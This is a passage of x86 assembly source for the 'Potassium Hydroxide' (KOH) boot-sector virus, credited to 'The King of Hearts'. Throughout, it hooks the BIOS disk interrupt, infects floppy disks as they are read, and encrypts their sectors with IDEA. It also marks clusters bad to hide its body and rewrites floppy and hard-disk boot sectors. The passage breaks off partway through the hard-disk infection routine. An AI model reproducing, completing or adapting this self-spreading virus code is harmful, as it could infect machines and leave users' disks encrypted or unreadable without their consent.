;Source Listing for the Potassium Hydroxide virus.
;                              written by The King of Hearts
;Version 1.00
;    Initial release - beta only
;Version 1.01
;    Upgrade to fix a number of bugs in 1.00, gets rid of casual encryption
;    and encrypts only one partition on disk, not whole disk, instant HD
;    password change.
;Version 1.02
;    Fixes failure of SETUP_HARD on some disks because the INT 41H vector
;    doesn't always point to a proper drive parameter table.
;    Fixes problem with some floppy drives that messes up 2nd FAT table.
;Version 1.03
;    Fixes inability to infect some floppy disks that are almost full but not
;    quite.

;Both of the following should always be odd for this to work right.
BUF_SIZE        EQU     9               ;Internal disk buffer size, in sectors
VIR_SIZE        EQU     9               ;Virus size, less boot sector, in sectors

VIRUS   SEGMENT BYTE
        ASSUME  CS:VIRUS,DS:VIRUS,ES:VIRUS,SS:VIRUS

        ORG     100H

;*******************************************************************************
;* VIRUS LOADER FOR A DISK IN DRIVE A:                                         *
;*******************************************************************************
START:
        mov     ah,9
        mov     dx,OFFSET WELCOME_MSG
        int     21H
        xor     ax,ax
        mov     ds,ax
        mov     si,13H*4                        ;save the old int 13H vector
        mov     di,OFFSET OLD_13H
        movsw
        movsw
        mov     ax,OFFSET INT_13H               ;and set up new interrupt 13H
        mov     bx,13H*4                        ;which everybody will have to
        mov     ds:[bx],ax                      ;use from now on
        mov     ax,es
        mov     ds:[bx+2],ax
        push    cs
        pop     ds                              ;restore ds to here

        call    ENCRYPT_STRINGS

        mov     [HPP],OFFSET FDHPP              ;floppy password
        call    MASTER_PASS                     ;create a new password

        mov     bx,80H                          ;check parameter
        mov     al,[bx]
        cmp     al,2
        jc      PAR1                            ;no parameter, assume a: drive
        mov     al,[bx+2]                       ;else get first letter
        or      al,20H                          ;make it lower case
        cmp     al,61H
        jc      PAR1                            ;must be "a" or "b", else exit
        cmp     al,63H
        jnc     PAR1
        sub     al,61H                          ;subtract "a"
        mov     dl,al                           ;and put drive letter here
        add     BYTE PTR [SUCCESS_MSG+17],al
        jmp     SHORT PAR2
PAR1:   mov     dl,0
PAR2:   mov     ax,0201H
        mov     bx,OFFSET DUMMY_BUF
        mov     cx,1
        mov     dh,0
        int     13H
        jnc     SUCCESS_LOAD
        cmp     ah,6
        je      SUCCESS_LOAD

ABORT_LOAD:
        mov     dx,OFFSET ABORT_MSG
        mov     ah,9
        int     21H
        jmp     SHORT EXIT_NOW

SUCCESS_LOAD:
        mov     dx,OFFSET SUCCESS_MSG
        mov     ah,9
        int     21H

EXIT_NOW:
        xor     ax,ax
        mov     ds,ax
        mov     ax,WORD PTR es:[OLD_13H]        ;restore old interrupt 13H
        mov     bx,13H*4
        mov     ds:[bx],ax
        mov     ax,WORD PTR es:[OLD_13H+2]
        mov     ds:[bx+2],ax
        mov     ax,4C00H

        int     21H

;This routine encrypts all strings in the virus
ENCRYPT_STRINGS:
        mov     bx,OFFSET STRING_LIST
ENCLP:  push    bx
        mov     si,[bx]
        or      si,si
        jz      ESTREND
        call    ENCRYPT_STRING
        pop     bx
        add     bx,2
        jmp     ENCLP
ESTREND:pop     bx
        ret

;This routine encrypts a string in the virus
ENCRYPT_STRING:
        mov     [RAND_SEED],si
ES1:    call    GET_RANDOM
        mov     al,[si]
        xor     [si],ah
        inc     si
        or      al,al
        jnz     ES1
ESEX:   ret


ABORT_MSG       DB      'Initial load failed... aborting.$'
SUCCESS_MSG     DB      'Load successful. A: now encrypted with KOH.$'
STRING_LIST     DW      OFFSET SURE
                DW      OFFSET ENCRYPT_QUERY1
                DW      OFFSET PW_EXPLAIN
                DW      OFFSET STOP_MSG
                DW      OFFSET FD_PWASK
                DW      OFFSET HD_PWCHASK
                DW      OFFSET FD_PWCHASK
                DW      OFFSET PW_HDEX
                DW      OFFSET HARD_ASK
                DW      OFFSET ENC_PASS1
                DW      OFFSET DEC_PASS
                DW      OFFSET ENC_PASS2
                DW      OFFSET BAD_PASS
                DW      OFFSET ALL_DONE
                DW      OFFSET NO_ROOM
                DW      OFFSET UPDATE_MSG
                DW      OFFSET CYL_LABEL
                DW      OFFSET HD_LABEL
                DW      0

DUMMY_BUF       DB      512 dup (?)

;*******************************************************************************
;* BIOS DATA AREA                                                              *
;*******************************************************************************

        ORG     413H

MEMSIZE DW      640                     ;size of memory installed, in KB

WELCOME_MSG     DB      'Potassium Hydroxide (KOH) Version 1.03 Loader             by the King of Hearts',0DH,0AH
                DB      '(C) 1995 American Eagle Publications, Inc. All rights reserved.',0DH,0AH,0AH
                DB      'This loader will migrate the KOH encryption system to a floppy disk of your',0DH,0AH
                DB      'choice (A or B) as specified on the command line. After encrypting, you must',0DH,0AH
                DB      'boot from that floppy to activate the decryption, or to migrate to a hard disk.',0DH,0AH
                DB      'This program uses the IDEA algorithm (implementation not developed in the US)',0DH,0AH
                DB      'in conjunction with a pass phrase up to 128 bytes long. Floppies and hard disks',0DH,0AH
                DB      'have their own separate pass phrases. The floppy uses it directly. The hard',0DH,0AH
                DB      'disk is encrypted with a 16 byte random number, which is decrypted with its',0DH,0AH
                DB      'pass phrase. Three commands can be activated when KOH is resident:',0DH,0AH,0DH,0AH
                DB      '     Ctrl-Alt-K allows one to change the pass phrases, floppy and hard disk.',0DH,0AH,0AH
                DB      '     Ctrl-Alt-O toggles floppy auto-migrate. When turned on, a "+" is displayed',0DH,0AH
                DB      '                and KOH will automatically encrypt every floppy it sees. When',0DH,0AH
                DB      '                turned off a "-" is displayed, and floppies are not touched.',0DH,0AH,0AH
                DB      '     Ctrl-Alt-H uninstalls KOH from the disk that was booted from.',0DH,0AH,0AH
                DB      'For more info see KOH.DOC!',0DH,0AH,0AH,'$'


;*******************************************************************************
;* VIRUS CODE STARTS HERE                                                      *
;*******************************************************************************
        ORG     7C00H - 512*VIR_SIZE - 512*BUF_SIZE - 48

LOCAL_STACK:

FDHPP   DB      16 dup (0)              ;floppy disk hashed pass phrase
HDKEY   DB      16 dup (0)              ;hard disk key, used to encrypt/decrypt sectors
HDHPP   DB      16 dup (0)              ;hard disk hashed pass phrase, to encrypt HDKEY

        ORG     7C00H - 512*VIR_SIZE - 512*BUF_SIZE

IDEAVIR:                                ;A label for the beginning of the virus


;*******************************************************************************
;* INTERRUPT 13H HANDLER                                                       *
;*******************************************************************************
;This routine must intercept reads and writes to the floppy disk and encrypt/
;decrypt them as necessary.

OLD_13H DD      ?                       ;Old interrupt 13H vector goes here
OLD_9   DD      ?                       ;Old interrupt 9 vector goes here

;The following calls the original rom bios INT 13. DO_INT13 just calls it once.
;DO_INT13E does error handling, calling it once, and if an error, doing a
;disk reset, and then calling it again, returning c if there is an error.
DO_INT13E:
        push    ax
        pushf
        call    DWORD PTR cs:[OLD_13H]
        jc      DI132
        add     sp,2                            ;exit now if 1st call was ok
        ret
DI132:  mov     ah,0                            ;1st call bad, reset and try again
        pushf
        call    DWORD PTR cs:[OLD_13H]
        pop     ax
DO_INT13:                                       ;bare call entry point
        pushf
        call    DWORD PTR cs:[OLD_13H]
        ret

INT_13H:
        sti
        cmp     ah,2                    ;we want to intercept reads
        jz      READ_FUNCTION
        cmp     ah,3                    ;and writes to all disks
        jz      WRITE_FUNCTION
        cmp     ah,5                    ;if a FORMAT function is called
        jnz     I131                    ;set a flag
        mov     BYTE PTR cs:[FORMAT_FLAG],1
        jmp     SHORT I13R
I131:   cmp     ah,16H                  ;likewise for change-line check
        jnz     I13R
        mov     BYTE PTR cs:[MOTOR_FLAG],1
I13R:   jmp     DWORD PTR cs:[OLD_13H]


;*******************************************************************************
;This section of code handles all attempts to access the Disk BIOS Function 3,
;(Write). If an attempt is made to write any sectors except the boot sector,
;this function must encrypt the data to write, write it, and then decrypt
;everything again. If the boot sector is written, it must not be encrypted!

WRITE_FUNCTION:
        mov     BYTE PTR cs:[ACTIVE],1
        mov     cs:[CURR_DISK],dl               ;set this with current disk no
        mov     cs:[SECS_READ],al
        call    IS_ENCRYPTED
        jz      WF1
        cmp     dx,80H                          ;write protect the virus here
        jnz     WF0
        cmp     cx,VIR_SIZE+4
        jc      WF3
WF0:    call    ENCRYPT_DATA
WF1:
        call    DO_INT13
        pushf
        call    IS_ENCRYPTED
        jz      WF2
        call    DECRYPT_DATA
WF2:    popf
WF3:    mov     BYTE PTR cs:[ACTIVE],0
        retf    2                               ;return and pop flags off of stack


;*******************************************************************************
;This section of code handles all attempts to access the Disk BIOS Function 2,
;(Read). If an attempt is made to read any sectors except the boot sector,
;this function must allow the read to proceed normally, and then decrypt
;everything read except the boot sector.
READ_FUNCTION:
        mov     BYTE PTR cs:[ACTIVE],1
        mov     cs:[SECS_READ],al
        mov     cs:[CURR_DISK],dl                  ;set this with current disk no
        mov     cs:[OLD_SS],ss
        mov     cs:[OLD_SP],sp
        cli
        push    cs
        pop     ss
        mov     sp,OFFSET LOCAL_STACK
        sti
        cmp     dl,80H                          ;skip infect routine for hard drives
        jnc     DO_READ
        call    INFECT_FLOPPY
        cmp     BYTE PTR cs:[CHANGE_FLAG],0     ;was change flag set in INFECT_FLOPPY?
        jz      DO_READ                         ;no, continue with read
        mov     BYTE PTR cs:[CHANGE_FLAG],0     ;yes, reset flag
        mov     ax,600H                         ;set ah=6, al=0, c on
        stc
        pushf                                   ;and exit now
        jmp     SHORT DONE_DECRYPT
DO_READ:
        call    DO_INT13
        pushf
        jnc     DOREAD1                         ;exit on error
        cmp     ah,11H
        jz      DOREAD1
        or      al,al
        jz      DONE_DECRYPT
        mov     cs:[SECS_READ],al
DOREAD1:call    IS_ENCRYPTED                    ;is disk encrypted?
        jz      DONE_DECRYPT                    ;no, don't try to decrypt it
        call    DECRYPT_DATA
DONE_DECRYPT:
        popf
        cli
        mov     ss,cs:[OLD_SS]
        mov     sp,cs:[OLD_SP]
        sti
        jmp     WF3                             ;return and pop flags off of stack

;This routine determines if CURR_DISK is encrypted or not. It returns with
;Z set if it isn't encrypted, and reset if it is. It is assumed that dl
;contains the current disk # on entry. No registers are changed.
IS_ENCRYPTED:
        cmp     dl,80H                          ;is it a hard drive?
        jnc     IE_HD                           ;yes, check it specially
        push    cx
        push    ax
        cmp     BYTE PTR cs:[FORMAT_FLAG],1
        jz      IEE
        mov     cl,dl
        mov     al,cs:[CRYPT_FLAG]
        shr     al,cl
        and     al,1
IEE:    pop     ax
        pop     cx
        ret

IE_HD:  jnz     IEZ                             ;drive other than c: ?
        push    ax
        mov     al,cs:[HD_CRYPT]                ;see if HD is encrypted
        or      al,al                           ;and set flag properly
        jz      IEHDE
        push    cx
        push    dx                              ;see if we're in right partition
        push    ds
        push    cs
        pop     ds
        call    DECODE_SECTOR
        cmp     cx,[FIRST_CYL]
        jc      IEZ2                            ;cx<first cyl, exit with z set
        jne     IEH2
        cmp     dh,[FIRST_HEAD]
        jc      IEZ2                            ;cx=first cyl, dh<first head, exit z
        jne     IEH2
        cmp     dl,[FIRST_SEC]
        jc      IEZ2                            ;cx=1st cyl, dh=1st head, dl<1st sec
IEH2:   cmp     cx,[LAST_CYL]
        jg      IEZ2                            ;cx>last cyl, exit with z set
        jne     IEH3
        cmp     dh,[LAST_HEAD]
        jg      IEZ2                            ;cx=last cyl, dh>last head
        jne     IEH3
        cmp     dl,[LAST_SEC]
        jg      IEZ2                            ;cx=last cyl, dh=last head, dl>last sec
        mov     al,1                            ;all ok, we're encrypted
        or      al,al
IEH3:   pop     ds
        pop     dx
        pop     cx
IEHDE:  pop     ax
        ret

IEZ2:   pop     ds
        pop     dx
        pop     cx
        pop     ax
IEZ:    push    ax                              ;return with Z set
        xor     al,al
        pop     ax
        ret

;This routine decrypts using IDEA. On entry, ax, es:bx, cx and dx must be set up just
;like they are for the INT 13. All registers are preserved on this call. This
;routine does not change the stack.
DECRYPT_DATA:
        mov     BYTE PTR cs:[cfb_dc_idea],0FFH
        jmp     SHORT CRYPT_DATA

;This routine encrypts using IDEA. On entry, ax, es:bx, cx and dx must be set up just
;like they are for the INT 13. All registers are preserved on this call. This
;routine does not change the stack.
ENCRYPT_DATA:
        mov     BYTE PTR cs:[cfb_dc_idea],0
CRYPT_DATA:
        cld
        push    ds
        push    es
        push    di                              ;save everything now
        push    si
        push    dx
        push    cx
        push    bx
        push    ax
        push    cs
        pop     ds
        mov     al,[SECS_READ]
        mov     [HPP],OFFSET FDHPP
        cmp     dl,80H
        jc      ED1
        mov     [HPP],OFFSET HDKEY
        call    SET_HARD
ED1:    or      dh,dh                           ;is it head 0?
        jnz     ED2                             ;nope, go encrypt
        cmp     cx,1                            ;is it track 0, sector 1?
        jz      ED3                             ;nope, go encrypt
ED2:    cmp     dl,80H
        jc      STRONG_CRYPT
        cmp     dh,[BSLOC_DH]
        jnz     STRONG_CRYPT
        cmp     cx,[BSLOC_CX]
        jnz     STRONG_CRYPT
ED3:    inc     cl
        dec     al
        add     bx,512
STRONG_CRYPT:
        xor     dl,dl
        or      al,al
        jz      WR_EN2
        mov     si,bx
WR_EN1: push    ax
        mov     [IV],dx
        mov     [IV+2],cx
        xor     ax,ax
        mov     [IV+4],ax
        mov     [IV+6],ax
        push    dx
        push    cx
        push    si
        call    initkey_idea
        pop     si
        push    si
        push    si
        call    ideasec
        pop     si
        pop     cx
        pop     dx
        pop     ax
        cmp     BYTE PTR [CURR_DISK],80H
        jnc     WR_EN15
        inc     cl                              ;on floppies, we just inc cl
        jmp     SHORT WR_EN17
WR_EN15:call    NEXT_SEC                        ;on HD, reads can jump hds and trks
        jnc     WR_EN2                          ;done with disk, exit
WR_EN17:add     si,512
        dec     al                              ;loop until everything is encrypted
        jnz     WR_EN1

WR_EN2:                                         ;restore registers
        pop     ax
        pop     bx
        pop     cx
        pop     dx
        pop     si
        pop     di
        pop     es
        pop     ds
        ret


;This routine increments cx/dx to the next sector. On floppies, it just increments
;cl, the sector number. On HD's, it must also handle head and track number.
;This includes the AMI extension to handle more than 1024 cylinders. Returns
;nc if it is past the last sector on disk.
NEXT_SEC:
        push    cx
        and     cl,00111111B
        inc     cx
        cmp     cl,BYTE PTR [SECS_PER_TRACK]
        pop     cx
        jg      NS1
        inc     cl
        jmp     SHORT NEXT_SEC_EXIT
NS1:    and     cl,11000000B
        inc     cl
        push    dx
        and     dh,00111111B
        inc     dh
        cmp     dh,BYTE PTR [HEADS]
        pop     dx
        jge     NS2
        inc     dh
        jmp     SHORT NEXT_SEC_EXIT
NS2:    and     dh,11000000B
        add     ch,1
        jnc     NEXT_SEC_EXIT
        add     cl,64
        jnc     NEXT_SEC_EXIT
        add     dh,64
NEXT_SEC_EXIT:
        cmp     BYTE PTR [CURR_DISK],80H
        jc      FLOPPY_EX
        push    cx
        push    dx
        call    DECODE_SECTOR
        cmp     cx,[LAST_CYL]
        jne     NSE
        cmp     dh,[LAST_HEAD]
        jne     NSE
        cmp     dl,[LAST_SEC]
        jne     NSE
        stc                             ;ok if dl=last sector
NSE:    pop     dx
        pop     cx
        ret

FLOPPY_EX:
        cmp     ch,BYTE PTR [TRACKS]    ;set c if ch < TRACKS
        ret


;This routine does all that is needed to infect a floppy disk. It determines
;whether the disk is infected, and if so, attempts an infect.
INFECT_FLOPPY:
        push    ds
        push    es
        push    di                              ;save everything now
        push    si
        push    dx
        push    cx
        push    bx
        push    ax
        mov     ax,cs
        mov     ds,ax
        mov     es,ax
        mov     ax,WORD PTR [DR_FLAG]
        push    ax
        mov     ax,WORD PTR [BS_SECS_PER_TRACK]
        push    ax
        mov     ax,WORD PTR [BS_HEADS]
        push    ax
        mov     ax,WORD PTR [BS_SECTORS_ON_DISK]
        push    ax
        xor     ax,ax                           ;set drive flag = 0 for any
        mov     WORD PTR [DR_FLAG],ax           ;floppies infected
        mov     [HPP],OFFSET FDHPP              ;use floppy password
        call    SHOULD_INFECT                   ;should we infect the floppy now?
        jnz     IF_END

        mov     cl,dl                           ;get current disk number
        mov     al,0FEH
        rol     al,cl                           ;assume we're not encrypted now,
        and     [CRYPT_FLAG],al                 ;so reset the crypt flag

        mov     ax,0201H                        ;move boot sector into SCRATCHBUF
        mov     bx,OFFSET SCRATCHBUF
        mov     cx,1
        mov     dh,0
        int     40H                             ;read boot sector
        jnc     INF2                            ;read was ok
        cmp     ah,6                            ;change flag set if ah=6
        jnz     INF1
        mov     [CHANGE_FLAG],ah                ;so save it here
INF1:   mov     ax,0201H
        int     40H                             ;try again
        jc      IF_END
INF2:   mov     bx,OFFSET SCRATCHBUF+200H       ;now read first fat sector
        inc     cx
        mov     ax,201H
        int     40H
        mov     al,BYTE PTR [SCRATCHBUF+15H]    ;get boot sector ID
        xor     al,BYTE PTR [SCRATCHBUF+200H]   ;xor with FAT ID
        jnz     INF5                            ;not same, encrypted, so skip encryption
        cmp     WORD PTR [SCRATCHBUF+201H],0FFFFH   ;better be FFFF
        jnz     INF5                            ;else encrypted
        cmp     [FD_INFECT],1                   ;should we infect??
        jz      INF55                           ;nope, don't encrypt
        call    INIT_FAT_MANAGER                ;set up disk parameters
        call    ENCRYPT_FLOPPY                  ;and encrypt the disk
        jc      IF_END                          ;if an error, exit and don't infect
        mov     ax,0201H                        ;re-load boot sector after encrypt
        mov     cx,1
        mov     dh,0
        mov     dl,[CURR_DISK]
        mov     bx,OFFSET SCRATCHBUF
        call    DO_INT13
        jc      IF_END                          ;exit if an error (shouldn't be)
INF5:   call    SET_CRYPT_FLAG                  ;now encrypted, set this flag
INF55:  cmp     [FD_INFECT],1
        jz      IF_END
        call    IS_VBS                          ;is viral boot sector there already?
        jnz     INF6                            ;nope, go infect it
        jmp     SHORT IF_END                    ;else exit
INF6:   call    INIT_FAT_MANAGER                ;initialize disk parameters
        call    MOVE_VIRUS_FLOPPY               ;and infect, if possible
IF_END: pop     ax
        mov     WORD PTR [BS_SECTORS_ON_DISK],ax
        pop     ax
        mov     WORD PTR [BS_HEADS],ax
        pop     ax
        mov     WORD PTR [BS_SECS_PER_TRACK],ax
        pop     ax
        mov     WORD PTR [DR_FLAG],ax
        pop     ax
        pop     bx
        pop     cx
        pop     dx
        pop     si
        pop     di
        pop     es
        pop     ds
        ret                                     ;return with flags set properly

;Set the CRYPT_FLAG for the current disk.
SET_CRYPT_FLAG:
        mov     cl,[CURR_DISK]                  ;if we get here, drive will be encrypted
        mov     al,1                            ;so set flag accordingly
        shl     al,cl
        or      [CRYPT_FLAG],al
        ret


;This routine determines whether we should infect now. It signals time to
;infect only if the drive motor is off. If the caller should proceed with
;infection, the Z flag is reset on return. On entry, dl should contain the
;drive number to check, and dl should not be changed by this routine.
SHOULD_INFECT:
        mov     al,[MOTOR_FLAG]
        mov     BYTE PTR [MOTOR_FLAG],0
        mov     ah,[FORMAT_FLAG]
        or      ah,ah                           ;then disable infect attempts
        jnz     SIR2
        xor     al,1                            ;likewise for MOTOR_FLAG
        jz      SIR
        push    ds                              ;test floppy motor
        xor     ax,ax
        mov     ds,ax
        mov     bx,43FH                         ;address of floppy motor status
        mov     al,[bx]
        pop     ds
        mov     cl,dl                           ;cl=drive number
        shr     al,cl                           ;put motor status for current drive in bit 0 of al
        and     al,1                            ;mask all other bits
SIR:    ret

SIR2:   pushf
        mov     ax,0E07H
        int     10H
        popf
        ret

;This routine encrypts the floppy disk in preparation for infecting it.
;The drive number is put in [CURR_DISK] before this is called. This uses the
;interrupt 13H handler to do the encryption.
ENCRYPT_FLOPPY:
        mov     cx,2                            ;int 13 parameters
        xor     dh,dh                           ;skip encrypting boot sector!
        mov     dl,[CURR_DISK]
        jmp     SHORT ENCRYPT_DISK

ENCRYPT_HARD:
        call    SET_HARD
        mov     dh,[BSLOC_DH]
        mov     cx,[BSLOC_CX]
        mov     dl,[CURR_DISK]

ENCRYPT_DISK:
        mov     [FIRST],ch                      ;set first=0
        mov     bx,OFFSET SCRATCHBUF
EFLP:   cmp     BYTE PTR [CURR_DISK],80H
        jne     EFL0
        call    DISP_STATUS
EFL0:   mov     al,BUF_SIZE
        mov     ah,BYTE PTR [SECS_PER_TRACK]
        push    cx
        and     cl,00111111B
        sub     ah,cl
        pop     cx
        inc     ah
        cmp     ah,al
        jnc     EFL1
        mov     al,ah
EFL1:   mov     ah,2                            ;read this many sectors, max
        mov     [SECS_READ],al
        call    DO_INT13E                       ;read sector without decryption
        jc      EF_RDERR                        ;exit on error
        mov     al,[REMOVE]
        mov     [cfb_dc_idea],al
        mov     ah,3
        mov     al,[SECS_READ]
        call    CRYPT_DATA                      ;now encrypt the data we read
        call    DO_INT13E                       ;and write it to disk
        jc      EF_WRERR                        ;and keep trying
        mov     BYTE PTR [FIRST],1
EFL2:   mov     al,[SECS_READ]
EFL3:   call    NEXT_SEC
        jnc     EF_EX
        dec     al
        jnz     EFL3
        jmp     EFLP

EF_ERR: stc                                     ;set carry on error
EF_EX:  ret                                     ;and exit now

;Handle read/write errors on disks here. Above is multiple sector read/write,
;but the following does it sector by sector, whenever an error occurs in a
;read or write on a sector.
EF_WRERR:
        cmp     BYTE PTR [FIRST],0
        jz      EF_ERR                          ;first write attempt? write protected
        or      al,al                           ;make sure nothing was written to disk
        jz      EF_RDERR
        mov     ah,[SECS_READ]
        sub     ah,al
        mov     [SECS_READ],ah
EF_WRLP:call    NEXT_SEC
        jnc     EF_EX
        dec     al
        jnz     EF_WRLP

EF_RDERR:                                       ;entry point for a read error
        mov     al,[SECS_READ]
EF_RDLP:push    ax
        mov     ax,201H                         ;read/encrypt/write one sector
        call    DO_INT13E
        jc      EF_NXT
        mov     al,[REMOVE]
        mov     [cfb_dc_idea],al
        mov     ax,301H
        call    CRYPT_DATA
        call    DO_INT13E
EF_NXT: call    NEXT_SEC
        pop     ax
        jnc     EF_EX
        dec     al
        jnz     EF_RDLP
        jmp     EFLP

;Display status of encryption for hard disk. This preserves all registers.
DISP_STATUS:
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        mov     si,OFFSET CYL_LABEL
        call    DISP_STRING
        call    DECODE_SECTOR
;        push    dx
        mov     ax,cx
        call    DISP_DECIMAL
;        mov     si,OFFSET HD_LABEL
;        call    DISP_STRING
;        pop     dx
;        mov     al,dh
;        xor     ah,ah
;        call    DISP_DECIMAL
        mov     ax,0E0DH
        int     10H
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        ret


;Display the decimal digit in ax, up to 9,999
DISP_DECIMAL:
        xor     dx,dx
        mov     cx,1000
        div     cx                      ;1000's digit in ax
        call    DISP_DIGIT
        mov     ax,dx
        xor     dx,dx
        mov     cx,100
        div     cx                      ;100's digit in ax
        call    DISP_DIGIT
        mov     ax,dx
        xor     dx,dx
        mov     cl,10
        div     cx                      ;10's digit in ax
        call    DISP_DIGIT
        mov     ax,dx                   ;1's digit in ax
        call    DISP_DIGIT
        ret

;Display a single decimal digit in al
DISP_DIGIT:
        add     al,30H
        mov     ah,0EH
        xor     bl,bl
        int     10H
        ret

CYL_LABEL       DB      'Cyl ',0
HD_LABEL        DB      ' Hd ',0

;This routine sets up the tracks, secs and heads for CURR_DISK when that is a
;hard drive.
SETUP_HARD:
        mov     ah,8                            ;use disk info to get cyls on disk
        mov     dl,80H
        int     13H
        jc      SH1                             ;if fctn 8 not supported, try direct approach
        mov     al,dh
        xor     ah,ah
        inc     ax
        mov     [HEADS],ax
        mov     ax,cx
        xchg    ah,al
        and     ah,0C0H
        rol     ah,1
        rol     ah,1
        mov     [TRACKS],ax
        and     cx,003FH
        mov     [SECS_PER_TRACK],cx             ;save secs/track on disk
        ret
SH1:    push    es
        xor     ax,ax
        mov     es,ax
        mov     bx,41H*4
        les     bx,es:[bx]
        mov     ax,es:[bx]
        mov     [TRACKS],ax
        xor     ah,ah
        mov     al,es:[bx+2]
        mov     [HEADS],ax
        mov     al,es:[bx+14]
        mov     [SECS_PER_TRACK],ax
        pop     es
        ret

;Fast version of above, once above called once
SET_HARD:
        push    ax
        mov     ax,[SECS_PER_TRACK]
        mov     [BS_SECS_PER_TRACK],ax
        mov     ax,[HEADS]
        mov     [BS_HEADS],ax
        mov     ax,[TRACKS]
        mov     [BS_SECTORS_ON_DISK],ax
        pop     ax
        ret


;*******************************************************************************
;This routine puts the virus on the floppy disk. It has no safeguards to prevent infecting
;an already infected disk. That must occur at a higher level. Also, it does
;not encrypt the floppy disk. That occurs elsewhere. On entry, [CURR_DISK] must contain
;the drive number to act upon.

MOVE_VIRUS_FLOPPY:
        mov     bx,VIR_SIZE+1                   ;number of sectors requested
        call    FIND_FREE                       ;find free space on disk
        jnc     INF01                           ;exit now if no space
        ret
INF01:  push    cx
        mov     dx,cx                           ;dx=cluster to start marking
        mov     cx,VIR_SIZE+1                   ;sectors requested
        call    MARK_CLUSTERS                   ;mark required clusters bad
        call    UPDATE_FAT_SECTOR               ;and write it to disk

        mov     ax,0201H
        mov     bx,OFFSET SCRATCHBUF
        mov     cx,1
        mov     dh,0
        mov     dl,[CURR_DISK]
        call    DO_INT13E                       ;read original boot sector

        mov     si,OFFSET BOOT_START            ;build floppy viral bs
        mov     di,OFFSET SCRATCHBUF + 512      ;temp buf for floppy viral bs
        mov     cx,256
        rep     movsw
        mov     si,OFFSET SCRATCHBUF + 11       ;BS_DATA in current sector
        mov     di,OFFSET SCRATCHBUF + 11 + 512
        mov     cx,2AH / 2                      ;copy boot sector disk info over
        rep     movsw                           ;to new boot sector
        mov     si,OFFSET SCRATCHBUF + 1ADH     ;move 51H bytes of boot sector
        mov     di,OFFSET SCRATCHBUF + 3ADH     ;to viral boot sector at end
        mov     cx,51H                          ;so boot works right on
        rep     movsb                           ;floppies too

        pop     cx
        call    CLUST_TO_ABSOLUTE               ;set cx,dx up with trk, sec, hd info
        mov     WORD PTR [VIRCX - OFFSET BOOT_START + OFFSET SCRATCHBUF + 512],cx
        mov     BYTE PTR [VIRDH - OFFSET BOOT_START + OFFSET SCRATCHBUF + 512],dh ;save in viral bs
        mov     BYTE PTR [CHANGE_FLAG - OFFSET BOOT_START + OFFSET SCRATCHBUF +512],0

        mov     dl,[CURR_DISK]
        mov     bx,OFFSET IDEAVIR
        mov     si,VIR_SIZE+1                   ;read/write VIR_SIZE+1 sectors
MVF2:   push    si
        mov     ax,0301H                        ;read/write 1 sector
        call    DO_INT13E                       ;call BIOS to read it
        pop     si
        jc      IFEX                            ;exit if it fails
        add     bx,512                          ;increment read buffer
        inc     cl                              ;get ready to do next sector--inc sector ct
        cmp     cl,BYTE PTR [SECS_PER_TRACK]    ;last sector on track?
        jbe     MVF3                            ;no, continue
        mov     cl,1                            ;yes, set sector=1
        inc     dh                              ;try next side
        cmp     dh,2                            ;last side?
        jb      MVF3                            ;no, continue
        xor     dh,dh                           ;yes, set side=0
        inc     ch                              ;and increment track count
MVF3:   dec     si
        jnz     MVF2
        mov     ax,WORD PTR [CHANGE_FLAG]       ;reset CHANGE_FLAG and FD_INFECT
        push    ax
        xor     dx,dx
        mov     WORD PTR [CHANGE_FLAG],dx
        mov     ax,0301H
        mov     bx,OFFSET SCRATCHBUF + 512
        mov     cx,1
        mov     dl,[CURR_DISK]
        call    DO_INT13E                       ;write viral boot sector into boot sector
        pop     ax
        mov     WORD PTR [CHANGE_FLAG],ax
IFEX:   ret


;*******************************************************************************
;Update the hard disk drive from version 1.00 to 1.01.
UPDATE_HARD:
        mov     si,OFFSET UPDATE_MSG
        call    DISP_STRING
        mov     ah,0
        int     16H
        ret


;Infect Hard Disk Drive AL with this virus. This involves the following steps:
;A) Read the present boot sector. B) Copy it to Track 0, Head 0, Sector 7.
;C) Copy the disk partition info into the viral boot sector in memory. D) Copy
;the viral boot sector to Track 0, Head 0, Sector 1. E) Copy the IDEAVIR
;routines to Track 0, Head 0, Sector 2, 5 sectors total.

INFECT_HARD:
        call    CLEAR_SCREEN
        mov     si,OFFSET HARD_ASK              ;ask if we should infect HD
        call    ASK                             ;ask if we should infect hard disk
        jz      IH00                            ;answer was no, abort
        jmp     IHDR
IH00:   mov     al,[CURR_DISK]
        push    ax
        mov     [CURR_DISK],80H
        call    SETUP_HARD
        pop     ax
        mov     [CURR_DISK],al
        cmp     [SECS_PER_TRACK],VIR_SIZE+3     ;make sure there's room
        jnc     IH02
IH01:   mov     si,OFFSET NO_ROOM
        call    DISP_STRING
        jmp     IHDR
IH02:   mov     ax,[BSLOC_CX]
        and     al,11000000B
        or      ah,[BSLOC_DH]
        or      ax,ax                           ;this better not be 0 or we don't have room
        jz      IH01                            ;else ok to infect

HARD_UPDATE:
        xor     al,al
        mov     [FD_INFECT],al                  ;set flag
        mov     dx,80H
        mov     [DR_FLAG],dl
        mov     bx,OFFSET SCRATCHBUF            ;go write original partition sector at
        mov     cx,VIR_SIZE+2                   ;track 0, head 0, sector VIR_SIZE+2
        mov     ax,301H
        call    DO_INT13E

        mov     di,OFFSET PARTPRE
        mov     si,OFFSET SCRATCHBUF + 1ADH
        mov     cx,51H                          ;copy partition table
        rep     movsb                           ;to new boot sector too!

        mov     bx,OFFSET PART - 10H
IH1:    add     bx,10H                          ;set up partition parameters
        cmp     BYTE PTR [bx],80H
        jne     IH1
        mov     dh,[bx+1]
        mov     cx,[bx+2]
        call    DECODE_SECTOR
        mov     [FIRST_HEAD],dh
        mov     [FIRST_SEC],dl
        mov     [FIRST_CYL],cx
        mov     dh,[bx+5]
        mov     cx,[bx+6]
        call    DECODE_SECTOR
        mov     [LAST_HEAD],dh
        mov     [LAST_SEC],dl
        mov     [LAST_CYL],cx

        mov     ax,[SECS_PER_TRACK]             ;set up disk parameters
        mov     [BS_SECS_PER_TRACK],ax
        mov     ax,[HEADS]
        mov     [BS_HEADS],ax
        mov     ax,[TRACKS]
        mov     [BS_SECTORS_ON_DISK],ax
        mov     [VIRCX],2                       ;tell the virus where to find itself
        mov     dx,80H
        mov     cx,1
        mov     [VIRDH],dh
        mov     ax,0301H
        mov     bx,OFFSET BOOT_START            ;write viral boot sector to drive
        call    DO_INT13E

        mov     bx,OFFSET IDEAVIR               ;buffer for VIR_SIZE sectors of virus body
        inc     cx
